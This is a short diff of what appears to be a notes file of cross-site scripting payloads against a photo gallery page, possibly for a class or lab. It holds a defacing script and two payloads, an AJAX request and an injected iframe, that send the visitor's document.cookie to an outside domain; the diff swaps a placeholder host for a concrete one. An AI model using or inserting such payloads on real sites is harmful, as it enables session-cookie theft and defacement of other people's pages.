@@ -8,7 +8,7 @@ ATTACK - Defacing
         " /><script>$('#header').html('<h1>This gallery sucks</h1>');</script>
         
 ATTACK - AJAX - This won't work.
-        " /><script>var x = $.get('http://my.malicious.domain?cookie=' + document.cookie);</script>
+        " /><script>var x = $.get('http://jeffandolora.com?cookie=' + document.cookie);</script>
     
 ATTACK - iframe injection
         " /><script>$('#header').html('<iframe src="http://jeffandolora.com?cookie=' + document.cookie + '"></iframe>');</script>
